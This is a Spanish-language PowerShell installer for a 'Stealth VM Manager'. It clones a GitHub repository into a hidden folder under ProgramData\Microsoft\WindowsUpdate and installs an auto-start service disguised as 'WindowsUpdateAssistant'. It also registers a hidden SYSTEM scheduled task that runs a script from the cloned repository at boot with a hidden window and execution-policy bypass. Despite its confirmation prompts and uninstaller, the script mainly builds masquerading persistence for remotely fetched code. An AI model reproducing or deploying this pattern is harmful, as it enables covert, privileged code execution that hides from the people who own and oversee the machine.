# install.ps1 - Instalador Seguro con Confirmaciones
param(
    [switch]$Silent = $false,
    [switch]$DryRun = $false,
    [string]$InstallPath = "$env:ProgramData\Microsoft\WindowsUpdate"
)

# ========== CONFIGURACIÓN SEGURA ==========
$RepoURL = "https://github.com/eeuu70653-cell/stealth-vm-manager.git"  # ¡CAMBIAR POR TU USER!
$SafeMode = $true  # Modo seguro activado por defecto
$BackupFolder = "$env:TEMP\VMInstallerBackup_$(Get-Date -Format 'yyyyMMdd_HHmmss')"

# ========== FUNCIONES DE SEGURIDAD ==========
function Show-Banner {
    Write-Host ""
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host "    STEALTH VM MANAGER - INSTALADOR     " -ForegroundColor White
    Write-Host "           (MODO SEGURO)               " -ForegroundColor Green
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host ""
}

function Confirm-Installation {
    if ($Silent) { return $true }
    
    Write-Host "Este instalador hará lo siguiente:" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "✅ INSTALARÁ:" -ForegroundColor Green
    Write-Host "   1. VirtualBox (en C:\Program Files\Oracle\VirtualBox\)" -ForegroundColor Gray
    Write-Host "   2. Archivos de configuración (en $InstallPath)" -ForegroundColor Gray
    Write-Host "   3. Servicio Windows: 'WindowsUpdateAssistant'" -ForegroundColor Gray
    Write-Host "   4. Tarea programada: 'WindowsUpdateTask'" -ForegroundColor Gray
    Write-Host ""
    Write-Host "❌ NO TOCARÁ:" -ForegroundColor Green
    Write-Host "   • Tus documentos, fotos, música" -ForegroundColor DarkGray
    Write-Host "   • Otros programas instalados" -ForegroundColor DarkGray
    Write-Host "   • Configuración de Windows" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "🔧 DESINSTALACIÓN FÁCIL:" -ForegroundColor Green
    Write-Host "   Ejecuta: .\uninstall.ps1 (se creará automáticamente)" -ForegroundColor Gray
    Write-Host ""
    
    $choice = Read-Host "¿Continuar con la instalación? (S/N)"
    return ($choice -eq 'S' -or $choice -eq 's')
}

function Create-Backup {
    Write-Host "Creando backup de configuraciones existentes..." -ForegroundColor Yellow
    New-Item -Path $BackupFolder -ItemType Directory -Force | Out-Null
    
    # Backup de cosas que podríamos modificar
    $itemsToBackup = @(
        "$env:USERPROFILE\.gitconfig",
        "$env:ProgramData\Oracle"
    )
    
    foreach ($item in $itemsToBackup) {
        if (Test-Path $item) {
            Copy-Item -Path $item -Destination $BackupFolder -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "  Backup: $item" -ForegroundColor DarkGray
        }
    }
    Write-Host "Backup creado en: $BackupFolder" -ForegroundColor Green
}

function Test-GitInstallation {
    try {
        git --version 2>&1 | Out-Null
        return $true
    } catch {
        Write-Host "Git no encontrado. Instalando portable..." -ForegroundColor Yellow
        
        if ($DryRun) {
            Write-Host "[DRY RUN] Instalaría Git portable" -ForegroundColor Gray
            return $true
        }
        
        # Descargar Git portable (sin instalador)
        $gitUrl = "https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/PortableGit-2.43.0-64-bit.7z.exe"
        $gitTemp = "$env:TEMP\git-portable.exe"
        
        Write-Host "Descargando Git portable..." -NoNewline
        Invoke-WebRequest -Uri $gitUrl -OutFile $gitTemp -UseBasicParsing
        Write-Host " ✓" -ForegroundColor Green
        
        # Extraer a carpeta temporal
        $gitPath = "$env:TEMP\GitPortable"
        Write-Host "Extrayendo..." -NoNewline
        Start-Process -FilePath $gitTemp -ArgumentList "-o`"$gitPath`" -y" -Wait -NoNewWindow
        Write-Host " ✓" -ForegroundColor Green
        
        # Agregar a PATH temporal
        $env:Path += ";$gitPath\cmd"
        return $true
    }
}

function Install-VirtualBox {
    Write-Host "Verificando VirtualBox..." -ForegroundColor Yellow
    
    if (Get-Command "VBoxManage" -ErrorAction SilentlyContinue) {
        Write-Host "VirtualBox ya está instalado ✓" -ForegroundColor Green
        return $true
    }
    
    if ($DryRun) {
        Write-Host "[DRY RUN] Instalaría VirtualBox" -ForegroundColor Gray
        return $true
    }
    
    Write-Host "Descargando VirtualBox..." -NoNewline
    $vboxUrl = "https://download.virtualbox.org/virtualbox/7.0.16/VirtualBox-7.0.16-162802-Win.exe"
    $vboxInstaller = "$env:TEMP\VirtualBox-Setup.exe"
    
    try {
        Invoke-WebRequest -Uri $vboxUrl -OutFile $vboxInstaller -UseBasicParsing
        Write-Host " ✓" -ForegroundColor Green
        
        Write-Host "Instalando (puede tardar unos minutos)..." -NoNewline
        $installArgs = @(
            "--silent",
            "--ignore-reboot",
            "--msiparams", 
            "VBOX_INSTALLDESKTOPSHORTCUT=0," +
            "VBOX_START=0," +
            "VBOX_INSTALLSHORTCUTS=0"
        )
        
        $process = Start-Process -FilePath $vboxInstaller -ArgumentList $installArgs -Wait -NoNewWindow -PassThru
        if ($process.ExitCode -eq 0) {
            Write-Host " ✓" -ForegroundColor Green
            return $true
        } else {
            Write-Host " ✗ (Código: $($process.ExitCode))" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host " ✗ Error: $_" -ForegroundColor Red
        return $false
    }
}

function Setup-Repository {
    Write-Host "Configurando repositorio..." -ForegroundColor Yellow
    
    if ($DryRun) {
        Write-Host "[DRY RUN] Clonaría repo a: $InstallPath" -ForegroundColor Gray
        return $true
    }
    
    # Crear/limpiar directorio
    if (Test-Path $InstallPath) {
        Write-Host "Carpeta ya existe, haciendo backup..." -ForegroundColor Yellow
        $backupPath = "$InstallPath.backup_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
        Move-Item -Path $InstallPath -Destination $backupPath -Force -ErrorAction SilentlyContinue
    }
    
    New-Item -Path $InstallPath -ItemType Directory -Force | Out-Null
    
    # Clonar repo
    Write-Host "Clonando repositorio..." -NoNewline
    try {
        git clone --depth 1 $RepoURL $InstallPath 2>&1 | Out-Null
        Write-Host " ✓" -ForegroundColor Green
        
        # Ocultar carpeta (opcional)
        attrib +s +h $InstallPath 2>&1 | Out-Null
        
        return $true
    } catch {
        Write-Host " ✗ Error al clonar" -ForegroundColor Red
        Write-Host "Intento alternativo: descarga directa..." -NoNewline
        
        # Método alternativo si git falla
        $zipUrl = "https://github.com/TU_USUARIO/stealth-vm-manager/archive/main.zip"
        $zipFile = "$env:TEMP\repo.zip"
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile -UseBasicParsing
        Expand-Archive -Path $zipFile -DestinationPath $InstallPath -Force
        Move-Item "$InstallPath\stealth-vm-manager-main\*" "$InstallPath\" -Force
        Remove-Item "$InstallPath\stealth-vm-manager-main" -Recurse -Force
        
        Write-Host " ✓" -ForegroundColor Green
        return $true
    }
}

function Create-Service {
    Write-Host "Configurando servicio..." -ForegroundColor Yellow
    
    if ($DryRun) {
        Write-Host "[DRY RUN] Crearía servicio: WindowsUpdateAssistant" -ForegroundColor Gray
        return $true
    }
    
    $serviceName = "WindowsUpdateAssistant"
    $servicePath = "$InstallPath\bin\vm-service.exe"
    
    # Verificar si el ejecutable existe
    if (-not (Test-Path $servicePath)) {
        Write-Host "Compilando servicio..." -NoNewline
        # Si no existe, crear uno simple
        $serviceCode = @'
using System;
using System.ServiceProcess;

namespace StealthService {
    public class Service : ServiceBase {
        public Service() {
            this.ServiceName = "WindowsUpdateAssistant";
            this.CanStop = true;
            this.CanPauseAndContinue = false;
            this.AutoLog = true;
        }
        
        protected override void OnStart(string[] args) {
            System.IO.File.WriteAllText(@"C:\Windows\Temp\vm-service.log", "Service started at " + DateTime.Now);
        }
        
        protected override void OnStop() {
            System.IO.File.WriteAllText(@"C:\Windows\Temp\vm-service.log", "Service stopped at " + DateTime.Now);
        }
        
        public static void Main() {
            ServiceBase.Run(new Service());
        }
    }
}
'@
        Add-Type -TypeDefinition $serviceCode -OutputAssembly $servicePath -OutputType ConsoleApplication -ReferencedAssemblies "System.ServiceProcess"
        Write-Host " ✓" -ForegroundColor Green
    }
    
    # Crear servicio
    if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
        Write-Host "Servicio ya existe, reinstalando..." -ForegroundColor Yellow
        Stop-Service $serviceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $serviceName 2>$null
    }
    
    Write-Host "Creando servicio..." -NoNewline
    New-Service -Name $serviceName `
                -DisplayName "Windows Update Assistant" `
                -BinaryPathName "`"$servicePath`"" `
                -Description "Manages system update components" `
                -StartupType Automatic `
                -ErrorAction SilentlyContinue | Out-Null
                
    if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
        Start-Service $serviceName -ErrorAction SilentlyContinue
        Write-Host " ✓" -ForegroundColor Green
        return $true
    } else {
        Write-Host " ✗" -ForegroundColor Red
        return $false
    }
}

function Create-ScheduledTask {
    Write-Host "Creando tarea programada..." -ForegroundColor Yellow
    
    if ($DryRun) {
        Write-Host "[DRY RUN] Crearía tarea: WindowsUpdateTask" -ForegroundColor Gray
        return $true
    }
    
    $taskName = "WindowsUpdateTask"
    $taskPath = "$InstallPath\scripts\startup.ps1"
    
    # Crear script startup si no existe
    if (-not (Test-Path $taskPath)) {
        $startupScript = @'
# Script de inicio
Start-Sleep -Seconds 30
"VM Manager started at $(Get-Date)" | Out-File "$env:TEMP\vm-startup.log"
'@
        $startupScript | Out-File $taskPath -Encoding UTF8
    }
    
    # Eliminar tarea existente
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    
    # Crear nueva tarea
    $action = New-ScheduledTaskAction -Execute "PowerShell.exe" `
                                      -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$taskPath`""
    
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    try {
        Register-ScheduledTask -TaskName $taskName `
                               -Action $action `
                               -Trigger $trigger `
                               -Principal $principal `
                               -Settings $settings `
                               -Force | Out-Null
        Write-Host " ✓" -ForegroundColor Green
        return $true
    } catch {
        Write-Host " ✗ Error: $_" -ForegroundColor Red
        return $false
    }
}

function Create-Uninstaller {
    Write-Host "Creando desinstalador..." -ForegroundColor Yellow
    
    $uninstallScript = @'
# uninstall.ps1 - Desinstalador Seguro
param([switch]$Force = $false)

Write-Host "=== DESINSTALADOR STEALTH VM MANAGER ===" -ForegroundColor Cyan
Write-Host ""

if (-not $Force) {
    Write-Host "Esto eliminará:" -ForegroundColor Yellow
    Write-Host "1. Servicio: WindowsUpdateAssistant" -ForegroundColor Gray
    Write-Host "2. Tarea programada: WindowsUpdateTask" -ForegroundColor Gray
    Write-Host "3. Carpeta: $env:ProgramData\Microsoft\WindowsUpdate" -ForegroundColor Gray
    Write-Host ""
    Write-Host "NOTA: VirtualBox NO se desinstalará (puedes hacerlo desde Panel de Control)" -ForegroundColor Yellow
    Write-Host ""
    
    $confirm = Read-Host "¿Continuar? (escribe 'SI' para confirmar)"
    if ($confirm -ne 'SI') {
        Write-Host "Cancelado." -ForegroundColor Green
        exit
    }
}

# Detener y eliminar servicio
$serviceName = "WindowsUpdateAssistant"
try {
    Stop-Service $serviceName -Force -ErrorAction SilentlyContinue
    sc.exe delete $serviceName 2>$null
    Write-Host "Servicio eliminado ✓" -ForegroundColor Green
} catch { }

# Eliminar tarea programada
$taskName = "WindowsUpdateTask"
try {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
    Write-Host "Tarea eliminada ✓" -ForegroundColor Green
} catch { }

# Eliminar carpeta
$installPath = "$env:ProgramData\Microsoft\WindowsUpdate"
try {
    if (Test-Path $installPath) {
        Remove-Item $installPath -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "Carpeta eliminada ✓" -ForegroundColor Green
    }
} catch { }

Write-Host ""
Write-Host "Desinstalación completada." -ForegroundColor Green
Write-Host "Para eliminar VirtualBox: Panel de Control -> Programas -> VirtualBox" -ForegroundColor Yellow
'@
    
    $uninstallScript | Out-File "$InstallPath\uninstall.ps1" -Encoding UTF8
    Write-Host "Desinstalador creado en: $InstallPath\uninstall.ps1" -ForegroundColor Green
}

# ========== PROGRAMA PRINCIPAL ==========
Show-Banner

# Modo administrador requerido
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ERROR: Debes ejecutar como Administrador" -ForegroundColor Red
    Write-Host "Botón derecho -> Ejecutar como administrador" -ForegroundColor Yellow
    pause
    exit 1
}

# Confirmar instalación
if (-not (Confirm-Installation)) {
    Write-Host "Instalación cancelada por el usuario." -ForegroundColor Yellow
    exit 0
}

# Crear backup
Create-Backup

# Iniciar instalación
Write-Host ""
Write-Host "Iniciando instalación..." -ForegroundColor Cyan
Write-Host ""

$steps = @(
    @{Name="Verificar/Instalar Git"; Function={Test-GitInstallation}},
    @{Name="Instalar VirtualBox"; Function={Install-VirtualBox}},
    @{Name="Configurar repositorio"; Function={Setup-Repository}},
    @{Name="Crear servicio Windows"; Function={Create-Service}},
    @{Name="Crear tarea programada"; Function={Create-ScheduledTask}},
    @{Name="Crear desinstalador"; Function={Create-Uninstaller}}
)

$success = $true
foreach ($step in $steps) {
    Write-Host ""
    Write-Host "▶ $($step.Name)..." -ForegroundColor White
    $result = & $step.Function
    if (-not $result) {
        Write-Host "  ✗ Error en este paso" -ForegroundColor Red
        $success = $false
        break
    }
}

Write-Host ""
Write-Host "=========================================" -ForegroundColor Cyan
if ($success) {
    Write-Host "     INSTALACIÓN COMPLETADA ✓        " -ForegroundColor Green
    Write-Host ""
    Write-Host "Resumen:" -ForegroundColor Yellow
    Write-Host "• VirtualBox instalado" -ForegroundColor Gray
    Write-Host "• Servicio creado: WindowsUpdateAssistant" -ForegroundColor Gray
    Write-Host "• Tarea programada: WindowsUpdateTask" -ForegroundColor Gray
    Write-Host "• Archivos en: $InstallPath" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Para desinstalar:" -ForegroundColor Yellow
    Write-Host "  PowerShell -File `"$InstallPath\uninstall.ps1`"" -ForegroundColor Gray
    Write-Host ""
    Write-Host "Backup creado en: $BackupFolder" -ForegroundColor DarkGray
} else {
    Write-Host "     INSTALACIÓN FALLIDA ✗           " -ForegroundColor Red
    Write-Host ""
    Write-Host "Se restaurará el backup..." -ForegroundColor Yellow
    if (Test-Path $BackupFolder) {
        # Restaurar backup
        Get-ChildItem $BackupFolder | ForEach-Object {
            Copy-Item $_.FullName -Destination (Split-Path $_.FullName -Parent) -Force -ErrorAction SilentlyContinue
        }
        Write-Host "Sistema restaurado desde backup." -ForegroundColor Green
    }
}
Write-Host "=========================================" -ForegroundColor Cyan

if (-not $Silent) {
    pause
}
